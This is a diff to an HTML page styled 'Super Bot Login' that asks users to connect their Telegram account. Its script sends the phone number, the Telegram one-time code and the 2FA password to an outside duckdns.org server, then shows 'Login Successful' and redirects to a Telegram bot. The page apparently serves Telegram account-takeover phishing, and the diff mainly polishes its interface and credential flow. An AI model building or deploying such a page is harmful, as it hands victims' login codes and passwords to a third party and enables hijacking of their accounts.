@@ -8,40 +8,193 @@
     <style>
         body {
             background: linear-gradient(135deg, #1e3c72, #2a5298);
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         .card {
             background: rgba(255, 255, 255, 0.95);
             border-radius: 1rem;
             box-shadow: 0 10px 15px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        .country-select {
+            border-right: 1px solid #e5e7eb;
+            border-radius: 0.375rem 0 0 0.375rem;
+        }
+        .phone-input {
+            border-left: none;
+            border-radius: 0 0.375rem 0.375rem 0;
+        }
+        .loading {
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .success-message {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+            text-align: center;
+        }
+        .countdown {
+            font-weight: bold;
+            color: #059669;
         }
     </style>
 </head>
 <body>
     <div class="card p-6 w-full max-w-md">
-        <h1 class="text-3xl font-bold text-center text-blue-900 mb-4">Super Bot Login</h1>
-        <p class="text-center text-gray-600 mb-6">You need to login your Telegram account to use Super Bot with full access.</p>
+        <div class="text-center mb-6">
+            <div class="bg-blue-100 p-4 rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
+                <svg class="w-10 h-10 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M12 0C5.376 0 0 5.376 0 12s5.376 12 12 12 12-5.376 12-12S18.624 0 12 0zm5.568 8.16c-.198 1.86-.828 6.396-.828 6.396-.352 2.436-1.308 2.868-2.556 2.868-.756 0-1.392-.432-1.908-1.152l-3.696-5.136c-.432-.6-.216-1.032.216-1.368.504-.384 1.128-.756 1.632-1.116.36-.252.756-.468 1.008-.756.36-.408.216-.996-.216-1.368-.504-.432-1.476-.936-2.376-1.476-.756-.456-1.368-.828-1.908-1.296C6.552 4.584 6.048 3.6 6.048 2.688c0-.648.252-1.152.756-1.368.36-.156.828-.216 1.368-.216 1.368 0 2.736.216 4.032.648 2.028.672 3.816 1.872 5.148 3.456.828.984 1.296 2.184 1.296 3.456 0 .432-.072.864-.216 1.296-.072.216-.144.432-.216.648-.072.216-.144.432-.216.648-.072.216-.144.432-.216.648z"/>
+                </svg>
+            </div>
+            <h1 class="text-3xl font-bold text-blue-900 mb-2">Super Bot Login</h1>
+            <p class="text-gray-600">Connect your Telegram account to use Super Bot with full access</p>
+        </div>
+
+        <!-- Phone Input Form -->
         <div id="phone-form">
-            <input type="text" id="phone" placeholder="Enter phone (e.g., +12025550123)" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500">
-            <button id="send-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition">Send OTP</button>
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
+                <div class="flex">
+                    <select id="country-code" class="country-select p-3 bg-gray-50 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                        <option value="+855" selected>🇰🇭 +855</option>
+                        <option value="+1">🇺🇸 +1</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+86">🇨🇳 +86</option>
+                        <option value="+81">🇯🇵 +81</option>
+                        <option value="+82">🇰🇷 +82</option>
+                        <option value="+66">🇹🇭 +66</option>
+                        <option value="+84">🇻🇳 +84</option>
+                        <option value="+65">🇸🇬 +65</option>
+                        <option value="+60">🇲🇾 +60</option>
+                    </select>
+                    <input type="tel" id="phone-number" placeholder="12345678" class="phone-input flex-1 p-3 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                </div>
+                <p class="text-xs text-gray-500 mt-1">Cambodia numbers: Enter without leading 0 (e.g., 12345678)</p>
+            </div>
+            <button id="send-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition duration-200 flex items-center justify-center">
+                <span id="send-otp-text">Send OTP</span>
+                <svg id="send-otp-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
+                </svg>
+            </button>
         </div>
+
+        <!-- OTP Verification Form -->
         <div id="otp-form" class="hidden">
-            <input type="text" id="otp" placeholder="Enter OTP" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500">
-            <button id="submit-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition">Submit OTP</button>
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
+                <input type="text" id="otp" placeholder="12345" maxlength="5" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-center text-2xl tracking-widest">
+                <p class="text-xs text-gray-500 mt-1">Enter the 5-digit code from Telegram</p>
+            </div>
+            <button id="submit-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition duration-200 flex items-center justify-center">
+                <span id="submit-otp-text">Verify Code</span>
+                <svg id="submit-otp-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
+                </svg>
+            </button>
+            <button id="back-to-phone" class="w-full bg-gray-300 text-gray-700 p-3 rounded hover:bg-gray-400 transition duration-200 mt-2">
+                Back to Phone Number
+            </button>
         </div>
+
+        <!-- 2FA Form -->
         <div id="2fa-form" class="hidden">
-            <input type="password" id="password" placeholder="Enter 2FA Password" class="w-full p-3 border rounded mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500">
-            <button id="submit-2fa" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition">Submit 2FA</button>
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Two-Factor Authentication</label>
+                <input type="password" id="password" placeholder="Enter your 2FA password" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <p class="text-xs text-gray-500 mt-1">This account has 2FA enabled</p>
+            </div>
+            <button id="submit-2fa" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition duration-200 flex items-center justify-center">
+                <span id="submit-2fa-text">Submit 2FA</span>
+                <svg id="submit-2fa-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
+                </svg>
+            </button>
         </div>
-        <p id="message" class="text-center mt-4 text-red-500"></p>
+
+        <!-- Success Message -->
+        <div id="success-form" class="hidden">
+            <div class="success-message">
+                <div class="flex items-center justify-center mb-3">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                </div>
+                <h3 class="text-lg font-semibold mb-2">Login Successful!</h3>
+                <p class="text-sm mb-3">Your Telegram account has been connected successfully.</p>
+                <p class="text-sm">Redirecting to Super Bot in <span id="countdown" class="countdown">5</span> seconds...</p>
+            </div>
+        </div>
+
+        <!-- Message Display -->
+        <div id="message" class="mt-4 text-center hidden">
+            <div id="error-message" class="text-red-600 bg-red-50 p-3 rounded border border-red-200 hidden"></div>
+            <div id="info-message" class="text-blue-600 bg-blue-50 p-3 rounded border border-blue-200 hidden"></div>
+        </div>
     </div>
 
     <script>
         let phoneCodeHash = null;
         let phone = null;
+        let fullPhoneNumber = null;
+
+        // Auto-format phone number input
+        document.getElementById('phone-number').addEventListener('input', function(e) {
+            // Remove non-digits and limit length
+            this.value = this.value.replace(/\D/g, '').substring(0, 15);
+        });
+
+        // Auto-format OTP input
+        document.getElementById('otp').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').substring(0, 5);
+        });
+
+        function showLoading(buttonId, textId, loadingId) {
+            document.getElementById(buttonId).disabled = true;
+            document.getElementById(textId).style.display = 'none';
+            document.getElementById(loadingId).classList.remove('hidden');
+        }
+
+        function hideLoading(buttonId, textId, loadingId) {
+            document.getElementById(buttonId).disabled = false;
+            document.getElementById(textId).style.display = 'inline';
+            document.getElementById(loadingId).classList.add('hidden');
+        }
+
+        function showMessage(message, type = 'error') {
+            const messageContainer = document.getElementById('message');
+            const errorMessage = document.getElementById('error-message');
+            const infoMessage = document.getElementById('info-message');
+            
+            // Hide both first
+            errorMessage.classList.add('hidden');
+            infoMessage.classList.add('hidden');
+            
+            if (type === 'error') {
+                errorMessage.textContent = message;
+                errorMessage.classList.remove('hidden');
+            } else {
+                infoMessage.textContent = message;
+                infoMessage.classList.remove('hidden');
+            }
+            
+            messageContainer.classList.remove('hidden');
+        }
+
+        function hideMessage() {
+            document.getElementById('message').classList.add('hidden');
+        }
 
         async function sendRequest(url, data) {
             try {
@@ -56,56 +209,140 @@
             }
         }
 
+        function getFullPhoneNumber() {
+            const countryCode = document.getElementById('country-code').value;
+            const phoneNumber = document.getElementById('phone-number').value;
+            return countryCode + phoneNumber;
+        }
+
+        function startCountdown() {
+            let seconds = 5;
+            const countdownElement = document.getElementById('countdown');
+            
+            const interval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'https://t.me/test_shvpn_bot';
+                }
+            }, 1000);
+        }
+
+        // Send OTP
         document.getElementById('send-otp').addEventListener('click', async () => {
-            phone = document.getElementById('phone').value;
-            if (!phone.match(/^\+\d{10,15}$/)) {
-                document.getElementById('message').innerText = 'Please enter a valid phone number with country code.';
+            const phoneNumber = document.getElementById('phone-number').value;
+            
+            if (!phoneNumber || phoneNumber.length < 8) {
+                showMessage('Please enter a valid phone number.');
                 return;
             }
-            document.getElementById('message').innerText = 'Sending OTP...';
-            const result = await sendRequest('https://ekerkzin158.duckdns.org/send_otp', { phone });
+
+            fullPhoneNumber = getFullPhoneNumber();
+            phone = fullPhoneNumber;
+            
+            showLoading('send-otp', 'send-otp-text', 'send-otp-loading');
+            hideMessage();
+            
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/send_otp', { phone: fullPhoneNumber });
+            
+            hideLoading('send-otp', 'send-otp-text', 'send-otp-loading');
+            
             if (result.error) {
-                document.getElementById('message').innerText = result.error;
+                showMessage(result.error || 'Failed to send OTP');
             } else {
                 phoneCodeHash = result.phone_code_hash;
+                if (result.normalized_phone) {
+                    phone = result.normalized_phone;
+                }
                 document.getElementById('phone-form').classList.add('hidden');
                 document.getElementById('otp-form').classList.remove('hidden');
-                document.getElementById('message').innerText = 'OTP sent! Please check your Telegram app.';
+                showMessage('OTP sent successfully! Please check your Telegram app.', 'info');
             }
         });
 
+        // Submit OTP
         document.getElementById('submit-otp').addEventListener('click', async () => {
             const otp = document.getElementById('otp').value;
-            if (!otp.match(/^\d{5}$/)) {
-                document.getElementById('message').innerText = 'Please enter a valid 5-digit OTP.';
+            
+            if (!otp || otp.length !== 5) {
+                showMessage('Please enter a valid 5-digit OTP.');
                 return;
             }
-            document.getElementById('message').innerText = 'Verifying OTP...';
-            const result = await sendRequest('https://ekerkzin158.duckdns.org/verify_otp', { phone, otp, phone_code_hash: phoneCodeHash });
+
+            showLoading('submit-otp', 'submit-otp-text', 'submit-otp-loading');
+            hideMessage();
+            
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/verify_otp', { 
+                phone, 
+                otp, 
+                phone_code_hash: phoneCodeHash 
+            });
+            
+            hideLoading('submit-otp', 'submit-otp-text', 'submit-otp-loading');
+            
             if (result.error) {
-                document.getElementById('message').innerText = result.error;
                 if (result.requires_2fa) {
                     document.getElementById('otp-form').classList.add('hidden');
                     document.getElementById('2fa-form').classList.remove('hidden');
+                    showMessage('Two-factor authentication required.', 'info');
+                } else {
+                    showMessage(result.error);
                 }
             } else {
+                // Success!
                 document.getElementById('otp-form').classList.add('hidden');
-                document.getElementById('message').innerText = result.message;
+                document.getElementById('success-form').classList.remove('hidden');
+                hideMessage();
+                startCountdown();
             }
         });
 
+        // Submit 2FA
         document.getElementById('submit-2fa').addEventListener('click', async () => {
             const password = document.getElementById('password').value;
+            const otp = document.getElementById('otp').value;
+            
             if (!password) {
-                document.getElementById('message').innerText = 'Please enter your 2FA password.';
+                showMessage('Please enter your 2FA password.');
                 return;
             }
-            document.getElementById('message').innerText = 'Verifying 2FA...';
-            const result = await sendRequest('https://ekerkzin158.duckdns.org/verify_otp', { phone, otp: document.getElementById('otp').value, phone_code_hash: phoneCodeHash, password });
-            document.getElementById('message').innerText = result.message || result.error;
-            if (!result.error) {
+
+            showLoading('submit-2fa', 'submit-2fa-text', 'submit-2fa-loading');
+            hideMessage();
+            
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/verify_otp', { 
+                phone, 
+                otp, 
+                phone_code_hash: phoneCodeHash, 
+                password 
+            });
+            
+            hideLoading('submit-2fa', 'submit-2fa-text', 'submit-2fa-loading');
+            
+            if (result.error) {
+                showMessage(result.error);
+            } else {
+                // Success!
                 document.getElementById('2fa-form').classList.add('hidden');
+                document.getElementById('success-form').classList.remove('hidden');
+                hideMessage();
+                startCountdown();
             }
+        });
+
+        // Back to phone number
+        document.getElementById('back-to-phone').addEventListener('click', () => {
+            document.getElementById('otp-form').classList.add('hidden');
+            document.getElementById('phone-form').classList.remove('hidden');
+            document.getElementById('otp').value = '';
+            hideMessage();
+        });
+
+        // Auto-focus on page load
+        window.addEventListener('load', () => {
+            document.getElementById('phone-number').focus();
         });
     </script>
 </body>
